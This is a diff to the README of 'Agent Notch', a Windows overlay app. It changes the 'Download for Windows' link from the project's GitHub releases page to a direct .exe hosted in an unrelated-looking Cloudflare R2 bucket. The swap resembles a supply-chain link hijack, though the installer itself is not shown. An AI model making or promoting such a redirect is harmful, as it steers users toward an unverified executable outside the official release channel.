@@ -8,7 +8,7 @@ A Dynamic-Island-style notch for Windows that shows what every coding agent is d
 
 [![Agent Notch demo](docs/demo.gif)](https://github.com/KurianJose7586/notch/releases/download/v0.3.1/AgentNotch-promo.mp4)
 
-[**Watch the 51s demo**](https://github.com/KurianJose7586/notch/releases/download/v0.3.1/AgentNotch-promo.mp4) · [**Download for Windows**](https://github.com/KurianJose7586/notch/releases/latest)
+[**Watch the 51s demo**](https://github.com/KurianJose7586/notch/releases/download/v0.3.1/AgentNotch-promo.mp4) · [**Download for Windows**](https://pub-671421c125c0425e9c137b3baf67b496.r2.dev/AgentNotch-Setup.exe)
 
 </div>
 
